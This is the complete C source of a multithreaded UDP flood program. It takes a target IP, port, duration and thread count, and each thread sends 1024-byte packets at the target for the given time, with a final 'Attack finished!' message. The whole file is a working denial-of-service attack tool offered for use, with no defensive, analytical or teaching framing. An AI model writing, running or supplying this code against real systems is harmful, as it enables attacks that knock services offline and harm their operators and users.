#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define PACKET_SIZE 1024

struct AttackInfo {
    char target_ip[16];
    int target_port;
    int duration;
    int threads;
};

void *udp_flood(void *arg) {
    struct AttackInfo *info = (struct AttackInfo *)arg;
    
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(info->target_port);
    target.sin_addr.s_addr = inet_addr(info->target_ip);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket error");
        free(info);  // Free allocated memory
        pthread_exit(NULL);
    }

    char packet[PACKET_SIZE];
    memset(packet, 0xFF, PACKET_SIZE);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < info->duration) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
    }
    
    close(sock);
    free(info);  // Free allocated memory
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return 1;
    }

    struct AttackInfo info;
    strncpy(info.target_ip, argv[1], 15);
    info.target_ip[15] = '\0';  // Ensure null termination
    info.target_port = atoi(argv[2]);
    info.duration = atoi(argv[3]);
    info.threads = atoi(argv[4]);

    if (info.threads <= 0) {
        printf("Error: Thread count must be greater than 0.\n");
        return 1;
    }
    
    if (info.target_port < 1 || info.target_port > 65535) {
        printf("Error: Invalid port number (1-65535 allowed).\n");
        return 1;
    }

    pthread_t *threads = malloc(info.threads * sizeof(pthread_t));
    if (!threads) {
        perror("Memory allocation error");
        return 1;
    }

    for (int i = 0; i < info.threads; i++) {
        struct AttackInfo *thread_info = malloc(sizeof(struct AttackInfo));
        if (!thread_info) {
            perror("Memory allocation error");
            return 1;
        }
        *thread_info = info;  // Copy structure to avoid shared memory issues

        if (pthread_create(&threads[i], NULL, udp_flood, thread_info) != 0) {
            perror("Thread creation failed");
            free(thread_info);
        }
    }

    for (int i = 0; i < info.threads; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    printf("Attack finished!\n");
    return 0;
}

